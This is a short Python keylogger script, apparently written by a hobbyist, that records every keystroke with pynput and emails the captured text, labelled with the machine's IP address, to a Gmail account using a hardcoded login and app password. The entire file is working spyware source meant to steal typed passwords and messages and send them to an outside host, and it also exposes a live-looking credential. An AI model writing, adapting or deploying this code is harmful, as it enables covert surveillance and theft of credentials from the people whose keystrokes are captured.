#version keylogger.py 1.0.1
print("keylogger version###############1.0.1##################")

from pynput.keyboard import Key, Listener
import smtplib, ssl
import time
import schedule
import socket
#this is the main sentence that is gonna be printed 
word = " "
from email.message import EmailMessage

def sendmail(user_message):
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    sender_email = "blackhatnatz@gmail.com"
    server.login(sender_email, "stipsgzhbjyonvle")
    msg = EmailMessage()
    msg['Subject'] = f'from {ip} '
    msg['From'] = sender_email
    msg['To'] = sender_email
    msg.set_content(user_message)
    server.send_message(msg)
def on_press(key):
#this is the function that records the pressed keys 
    global word
#this are the conditionals that helps to make anything you want using the 
  
    if (key == Key.space) or key == Key.enter:
        word += ' '
        
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift:
        word += ''
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    print("{0} pressed".format(key))
    
    for i in range(1,11):
        if len(word) / 100 == i:
            sendmail(word)


with Listener(on_press=on_press) as listener:
    listener.join()


 